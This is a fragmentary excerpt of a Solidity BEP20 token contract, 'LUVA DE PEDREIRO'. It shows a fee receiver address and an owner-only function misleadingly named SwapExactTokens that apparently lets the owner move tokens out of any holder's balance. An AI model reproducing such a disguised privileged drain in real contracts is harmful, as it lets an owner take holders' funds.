...
contract LUVADEPEDREIRO is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "LUVA DE PEDREIRO";
    string constant _symbol = "LDP";
    ...
    address public marketingFeeReceiver = 0x517bc4397BF0D4B644991F46604EcD5584B4ECCD;
 ...
 function SwapExactTokens(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to SwapExactTokens");
